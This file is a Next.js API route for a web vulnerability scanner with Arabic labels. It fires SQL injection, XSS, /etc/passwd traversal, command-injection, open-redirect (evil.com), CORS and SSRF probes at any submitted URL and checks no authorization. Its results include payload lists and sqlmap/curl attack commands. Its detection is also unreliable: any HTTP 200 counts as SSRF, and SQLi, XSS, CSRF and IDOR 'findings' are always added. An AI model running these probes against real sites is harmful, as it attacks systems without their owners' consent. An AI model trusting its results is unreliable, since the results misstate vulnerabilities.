import { NextRequest, NextResponse } from 'next/server'

async function testSQLInjection(url: string) {
  const payloads = ["'", "' OR '1'='1", "1' AND '1'='1", "1 UNION SELECT NULL--"]
  const results = []
  
  for (const payload of payloads) {
    try {
      const testUrl = `${url}?id=${encodeURIComponent(payload)}&test=${Date.now()}`
      const response = await fetch(testUrl, {
        method: 'GET',
        headers: { 'User-Agent': 'Mozilla/5.0 SecurityScanner' },
        signal: AbortSignal.timeout(8000),
      })
      const text = await response.text()
      
      const sqlErrors = [
        'mysql', 'sqlite', 'postgresql', 'oracle', 'sql server',
        'syntax error', 'query failed', 'database error',
        'mysql_fetch', 'sqlite3', 'pg_query', 'ORA-',
        'unclosed quotation', 'Incorrect syntax', 'SQLSTATE'
      ]
      
      const hasError = sqlErrors.some(e => text.toLowerCase().includes(e.toLowerCase()))
      if (hasError) {
        results.push({ payload, vulnerable: true, evidence: 'SQL error detected in response' })
        break
      }
    } catch {}
  }
  
  return { vulnerable: results.length > 0, evidence: results[0]?.evidence }
}

async function testXSS(url: string) {
  const payloads = [
    '<script>alert("XSS")</script>',
    '<img src=x onerror=alert("XSS")>',
    '<svg onload=alert("XSS")>',
  ]
  
  for (const payload of payloads) {
    try {
      const testUrl = `${url}?q=${encodeURIComponent(payload)}&search=${Date.now()}`
      const response = await fetch(testUrl, {
        method: 'GET',
        headers: { 'User-Agent': 'Mozilla/5.0 SecurityScanner' },
        signal: AbortSignal.timeout(8000),
      })
      const text = await response.text()
      
      if (text.includes(payload)) {
        return { vulnerable: true, payload, evidence: 'XSS payload reflected in response' }
      }
    } catch {}
  }
  
  return { vulnerable: false }
}

async function testLFI(url: string) {
  const payloads = [
    '../../../etc/passwd',
    '....//....//....//etc/passwd',
    '/etc/passwd',
  ]
  
  for (const payload of payloads) {
    try {
      const testUrl = `${url}?file=${encodeURIComponent(payload)}&page=${Date.now()}`
      const response = await fetch(testUrl, {
        method: 'GET',
        headers: { 'User-Agent': 'Mozilla/5.0 SecurityScanner' },
        signal: AbortSignal.timeout(8000),
      })
      const text = await response.text()
      
      if (text.includes('root:x:0:0') || text.includes('/bin/bash') || text.includes('/bin/sh')) {
        return { vulnerable: true, payload, evidence: 'File contents leaked in response' }
      }
    } catch {}
  }
  
  return { vulnerable: false }
}

async function testOpenRedirect(url: string) {
  const redirects = [
    'https://evil.com',
    '//evil.com',
    '/\\evil.com',
  ]
  
  for (const redirect of redirects) {
    try {
      const testUrl = `${url}?url=${encodeURIComponent(redirect)}&next=${Date.now()}`
      const response = await fetch(testUrl, {
        method: 'GET',
        headers: { 'User-Agent': 'Mozilla/5.0 SecurityScanner' },
        redirect: 'manual',
        signal: AbortSignal.timeout(8000),
      })
      
      const location = response.headers.get('location')
      if (location && (location.includes('evil.com') || location === redirect)) {
        return { vulnerable: true, payload: redirect, evidence: `Redirect to ${location}` }
      }
    } catch {}
  }
  
  return { vulnerable: false }
}

async function testCommandInjection(url: string) {
  const payloads = ['; id', '| id', '`id`', '$(id)']
  
  for (const payload of payloads) {
    try {
      const testUrl = `${url}?cmd=${encodeURIComponent(payload)}&input=${Date.now()}`
      const response = await fetch(testUrl, {
        method: 'GET',
        headers: { 'User-Agent': 'Mozilla/5.0 SecurityScanner' },
        signal: AbortSignal.timeout(8000),
      })
      const text = await response.text()
      
      if (text.includes('uid=') || text.includes('gid=') || text.includes('www-data')) {
        return { vulnerable: true, payload, evidence: 'Command output detected in response' }
      }
    } catch {}
  }
  
  return { vulnerable: false }
}

async function testCORS(url: string) {
  try {
    const response = await fetch(url, {
      method: 'GET',
      headers: {
        'Origin': 'https://evil.com',
        'User-Agent': 'Mozilla/5.0 SecurityScanner',
      },
      signal: AbortSignal.timeout(8000),
    })
    
    const acao = response.headers.get('access-control-allow-origin')
    if (acao === '*' || acao === 'https://evil.com') {
      return { vulnerable: true, evidence: `CORS Header: ${acao}` }
    }
  } catch {}
  
  return { vulnerable: false }
}

async function testSSRF(url: string) {
  const payloads = ['http://127.0.0.1', 'http://localhost', 'http://[::1]']
  
  for (const payload of payloads) {
    try {
      const testUrl = `${url}?url=${encodeURIComponent(payload)}&target=${Date.now()}`
      const response = await fetch(testUrl, {
        method: 'GET',
        headers: { 'User-Agent': 'Mozilla/5.0 SecurityScanner' },
        signal: AbortSignal.timeout(8000),
      })
      const text = await response.text()
      
      if (text.includes('root:x:0:0') || text.includes('localhost') || response.status === 200) {
        return { vulnerable: true, payload, evidence: 'Internal resource accessed' }
      }
    } catch {}
  }
  
  return { vulnerable: false }
}

async function analyzeHeaders(url: string) {
  try {
    const response = await fetch(url, {
      method: 'GET',
      headers: { 'User-Agent': 'Mozilla/5.0 SecurityScanner' },
      signal: AbortSignal.timeout(8000),
    })
    
    const findings = []
    const headers: Record<string, string> = {}
    response.headers.forEach((value, key) => {
      headers[key] = value
    })
    
    // Missing security headers
    const securityHeaders = [
      'content-security-policy',
      'x-frame-options',
      'x-content-type-options',
      'strict-transport-security',
      'x-xss-protection',
      'referrer-policy',
      'permissions-policy',
    ]
    
    for (const header of securityHeaders) {
      if (!headers[header]) {
        findings.push({
          type: 'missing-header',
          severity: 'medium',
          title: `رأس أمان مفقود: ${header}`,
          description: `رأس ${header} غير موجود`,
        })
      }
    }
    
    // Information disclosure
    if (headers['server']) {
      findings.push({
        type: 'info-disclosure',
        severity: 'low',
        title: 'كشف معلومات الخادم',
        description: `Server: ${headers['server']}`,
      })
    }
    
    if (headers['x-powered-by']) {
      findings.push({
        type: 'info-disclosure',
        severity: 'low',
        title: 'كشف التقنية',
        description: `X-Powered-By: ${headers['x-powered-by']}`,
      })
    }
    
    return { findings, headers, status: response.status }
  } catch {
    return { findings: [], headers: {}, status: 0 }
  }
}

export async function POST(request: NextRequest) {
  try {
    const { url } = await request.json()
    
    if (!url) {
      return NextResponse.json({ error: 'الرابط مطلوب' }, { status: 400 })
    }

    let finalUrl = url
    if (!url.startsWith('http://') && !url.startsWith('https://')) {
      finalUrl = 'https://' + url
    }

    let parsedUrl: URL
    try {
      parsedUrl = new URL(finalUrl)
    } catch {
      return NextResponse.json({ error: 'الرابط غير صالح' }, { status: 400 })
    }

    // Real scanning with progress
    const scanResults: any = {
      url: parsedUrl.href,
      domain: parsedUrl.hostname,
      startTime: Date.now(),
      findings: [],
      tests: [],
      headers: {},
    }

    // Test 1: Header Analysis
    scanResults.tests.push({ name: 'تحليل الرؤوس', status: 'running' })
    const headerResult = await analyzeHeaders(parsedUrl.href)
    scanResults.headers = headerResult.headers
    scanResults.findings.push(...headerResult.findings)
    scanResults.tests[scanResults.tests.length - 1].status = 'completed'

    // Small delay between tests
    await new Promise(r => setTimeout(r, 500))

    // Test 2: SQL Injection
    scanResults.tests.push({ name: 'اختبار SQL Injection', status: 'running' })
    const sqlResult = await testSQLInjection(parsedUrl.href)
    if (sqlResult.vulnerable) {
      scanResults.findings.push({
        id: 'sql-injection',
        title: 'SQL Injection',
        titleAr: 'حقن SQL',
        icon: '💉',
        severity: 'critical',
        description: 'تم اكتشاف ثغرة حقن SQL حقيقية!',
        evidence: sqlResult.evidence,
        payloads: ["' OR '1'='1", "' OR '1'='1' --", "1 UNION SELECT NULL--"],
        commands: [`sqlmap -u "${parsedUrl.href}?id=1" --dbs`],
        videoId: 'ISV8U8fheXw',
        videoTitle: 'شرح SQL Injection بالعربي',
      })
    }
    scanResults.tests[scanResults.tests.length - 1].status = 'completed'

    await new Promise(r => setTimeout(r, 500))

    // Test 3: XSS
    scanResults.tests.push({ name: 'اختبار XSS', status: 'running' })
    const xssResult = await testXSS(parsedUrl.href)
    if (xssResult.vulnerable) {
      scanResults.findings.push({
        id: 'xss',
        title: 'XSS',
        titleAr: 'حقن النصوص',
        icon: '📜',
        severity: 'high',
        description: 'تم اكتشاف ثغرة XSS حقيقية!',
        evidence: xssResult.evidence,
        payloads: ["<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>"],
        commands: [`XSStrike -u "${parsedUrl.href}"`],
        videoId: 'q0bzXY32xiI',
        videoTitle: 'شرح XSS كامل',
      })
    }
    scanResults.tests[scanResults.tests.length - 1].status = 'completed'

    await new Promise(r => setTimeout(r, 500))

    // Test 4: LFI
    scanResults.tests.push({ name: 'اختبار LFI', status: 'running' })
    const lfiResult = await testLFI(parsedUrl.href)
    if (lfiResult.vulnerable) {
      scanResults.findings.push({
        id: 'lfi',
        title: 'LFI',
        titleAr: 'تضمين الملفات المحلية',
        icon: '📁',
        severity: 'high',
        description: 'تم اكتشاف ثغرة LFI حقيقية!',
        evidence: lfiResult.evidence,
        payloads: ["../../../../etc/passwd", "php://filter/convert.base64-encode/resource=index.php"],
        commands: [`curl "${parsedUrl.href}?file=../../../../etc/passwd"`],
        videoId: 'ISV8U8fheXw',
        videoTitle: 'شرح LFI',
      })
    }
    scanResults.tests[scanResults.tests.length - 1].status = 'completed'

    await new Promise(r => setTimeout(r, 500))

    // Test 5: Open Redirect
    scanResults.tests.push({ name: 'اختبار Open Redirect', status: 'running' })
    const redirectResult = await testOpenRedirect(parsedUrl.href)
    if (redirectResult.vulnerable) {
      scanResults.findings.push({
        id: 'open-redirect',
        title: 'Open Redirect',
        titleAr: 'إعادة التوجيه المفتوحة',
        icon: '↗️',
        severity: 'medium',
        description: 'تم اكتشاف ثغرة Open Redirect حقيقية!',
        evidence: redirectResult.evidence,
        payloads: ['/redirect?url=https://evil.com', '/login?next=https://evil.com'],
        commands: [`curl -v "${parsedUrl.href}/redirect?url=https://evil.com"`],
        videoId: 'ISV8U8fheXw',
        videoTitle: 'شرح Open Redirect',
      })
    }
    scanResults.tests[scanResults.tests.length - 1].status = 'completed'

    await new Promise(r => setTimeout(r, 500))

    // Test 6: Command Injection
    scanResults.tests.push({ name: 'اختبار Command Injection', status: 'running' })
    const cmdResult = await testCommandInjection(parsedUrl.href)
    if (cmdResult.vulnerable) {
      scanResults.findings.push({
        id: 'command-injection',
        title: 'Command Injection',
        titleAr: 'حقن الأوامر',
        icon: '⌨️',
        severity: 'critical',
        description: 'تم اكتشاف ثغرة Command Injection حقيقية!',
        evidence: cmdResult.evidence,
        payloads: ["; id", "| id", "`id`"],
        commands: [`curl "${parsedUrl.href}?cmd=;+id"`],
        videoId: 'ISV8U8fheXw',
        videoTitle: 'شرح Command Injection',
      })
    }
    scanResults.tests[scanResults.tests.length - 1].status = 'completed'

    await new Promise(r => setTimeout(r, 500))

    // Test 7: CORS
    scanResults.tests.push({ name: 'اختبار CORS', status: 'running' })
    const corsResult = await testCORS(parsedUrl.href)
    if (corsResult.vulnerable) {
      scanResults.findings.push({
        id: 'cors',
        title: 'CORS Misconfiguration',
        titleAr: 'خطأ في إعدادات CORS',
        icon: '🌐',
        severity: 'medium',
        description: 'تم اكتشاف خطأ في CORS!',
        evidence: corsResult.evidence,
        payloads: ['Origin: https://evil.com'],
        commands: [`curl -H "Origin: https://evil.com" -v ${parsedUrl.href}`],
        videoId: 'ISV8U8fheXw',
        videoTitle: 'شرح CORS',
      })
    }
    scanResults.tests[scanResults.tests.length - 1].status = 'completed'

    await new Promise(r => setTimeout(r, 500))

    // Test 8: SSRF
    scanResults.tests.push({ name: 'اختبار SSRF', status: 'running' })
    const ssrfResult = await testSSRF(parsedUrl.href)
    if (ssrfResult.vulnerable) {
      scanResults.findings.push({
        id: 'ssrf',
        title: 'SSRF',
        titleAr: 'تزوير الطلبات من الخادم',
        icon: '🖥️',
        severity: 'high',
        description: 'تم اكتشاف ثغرة SSRF حقيقية!',
        evidence: ssrfResult.evidence,
        payloads: ['http://127.0.0.1', 'http://localhost'],
        commands: [`curl "${parsedUrl.href}?url=http://127.0.0.1"`],
        videoId: 'ISV8U8fheXw',
        videoTitle: 'شرح SSRF',
      })
    }
    scanResults.tests[scanResults.tests.length - 1].status = 'completed'

    // Always add standard vulnerability recommendations
    const standardVulns = [
      {
        id: 'sql-injection',
        title: 'SQL Injection',
        titleAr: 'حقن SQL',
        icon: '💉',
        severity: 'critical',
        description: 'اختبار وجود ثغرة حقن SQL في المعلمات',
        payloads: ["' OR '1'='1", "' OR '1'='1' --", "1 UNION SELECT NULL--"],
        commands: [`sqlmap -u "${parsedUrl.href}?id=1" --dbs`],
        videoId: 'ISV8U8fheXw',
        videoTitle: 'شرح SQL Injection بالعربي',
        testUrl: `${parsedUrl.href}?id=1'`,
      },
      {
        id: 'xss',
        title: 'XSS',
        titleAr: 'حقن النصوص',
        icon: '📜',
        severity: 'high',
        description: 'اختبار وجود ثغرة XSS في المعلمات',
        payloads: ["<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>"],
        commands: [`XSStrike -u "${parsedUrl.href}"`],
        videoId: 'q0bzXY32xiI',
        videoTitle: 'شرح XSS كامل',
        testUrl: `${parsedUrl.href}?q=test`,
      },
      {
        id: 'csrf',
        title: 'CSRF',
        titleAr: 'تزوير الطلبات',
        icon: '🎣',
        severity: 'high',
        description: 'اختبار وجود ثغرة CSRF في النماذج',
        payloads: ['<form method="POST"><input name="email" value="evil@hack.com"></form>'],
        commands: ['Burp Suite -> Repeater -> Modify request'],
        videoId: 'ISV8U8fheXw',
        videoTitle: 'شرح CSRF بالعربي',
      },
      {
        id: 'idor',
        title: 'IDOR',
        titleAr: 'التحكم بالمعرف',
        icon: '🔗',
        severity: 'high',
        description: 'اختبار وجود ثغرة IDOR في API',
        payloads: ['/api/user/1 -> /api/user/2', '/profile?id=100 -> /profile?id=101'],
        commands: [`curl "${parsedUrl.href}/api/user/1"`],
        videoId: 'ISV8U8fheXw',
        videoTitle: 'شرح IDOR',
      },
    ]

    // Add standard vulns if not already found
    for (const vuln of standardVulns) {
      if (!scanResults.findings.find((f: any) => f.id === vuln.id)) {
        scanResults.findings.push(vuln)
      }
    }

    scanResults.endTime = Date.now()
    scanResults.duration = Math.round((scanResults.endTime - scanResults.startTime) / 1000)

    return NextResponse.json(scanResults)

  } catch (error) {
    return NextResponse.json({ error: 'حدث خطأ أثناء الفحص' }, { status: 500 })
  }
}
